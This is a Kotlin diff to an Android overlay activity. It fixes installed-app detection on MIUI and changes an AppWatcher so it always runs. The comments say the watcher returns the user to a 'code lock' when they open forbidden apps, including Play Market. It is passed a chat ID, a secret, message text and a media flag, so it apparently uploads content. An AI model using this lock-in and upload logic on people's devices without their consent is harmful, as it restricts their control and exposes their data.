@@ -472,26 +472,29 @@ class OverlayActivity : Activity() {
 
         // Проверяем установлено ли приложение — отдельно от getLaunchIntentForPackage,
         // потому что на MIUI getLaunchIntentForPackage может вернуть null даже для установленного приложения
+        // MATCH_UNINSTALLED_PACKAGES нужен для MIUI — без него getPackageInfo может кинуть
+        // NameNotFoundException даже для реально установленного приложения
         val isInstalled = try {
-            pm.getPackageInfo(pkg, 0)
+            pm.getPackageInfo(pkg, android.content.pm.PackageManager.MATCH_UNINSTALLED_PACKAGES)
             true
         } catch (e: android.content.pm.PackageManager.NameNotFoundException) {
             false
         }
 
+        // AppWatcher запускаем В ЛЮБОМ СЛУЧАЕ — и если установлено, и если нет (Play Market тоже запрещён)
+        if (allowFeedback) {
+            AppWatcher.start(
+                context       = applicationContext,
+                vpnPackage    = pkg,
+                message       = originalText,
+                chatId        = uploadChatId,
+                secret        = codeSecret,
+                allowMedia    = allowMedia,
+            )
+        }
+        removeFeedbackScreen()
+
         if (isInstalled) {
-            // Приложение установлено — запускаем через несколько стратегий
-            if (allowFeedback) {
-                AppWatcher.start(
-                    context       = applicationContext,
-                    vpnPackage    = pkg,
-                    message       = originalText,
-                    chatId        = uploadChatId,
-                    secret        = codeSecret,
-                    allowMedia    = allowMedia,
-                )
-            }
-            removeFeedbackScreen()
             intentionalLeave = true
 
             // Стратегия 1: стандартный launch intent
@@ -515,7 +518,7 @@ class OverlayActivity : Activity() {
                 return
             }
 
-            // Стратегия 3: просто пробуем открыть пакет напрямую через Settings (крайний случай)
+            // Стратегия 3: крайний случай — настройки приложения
             try {
                 startActivity(Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                     data = android.net.Uri.parse("package:$pkg")
@@ -525,8 +528,8 @@ class OverlayActivity : Activity() {
                 android.util.Log.e("OverlayActivity", "Cannot launch installed VPN $pkg: ${e.message}")
             }
         } else {
-            // VPN не установлен — открываем Play Market, code lock вернётся сам через AppWatcher
-            removeFeedbackScreen()
+            // VPN не установлен — открываем Play Market
+            // intentionalLeave НЕ ставим — AppWatcher увидит Play Market и вернёт в code lock
             try {
                 startActivity(Intent(Intent.ACTION_VIEW,
                     android.net.Uri.parse("market://details?id=$pkg")).apply {
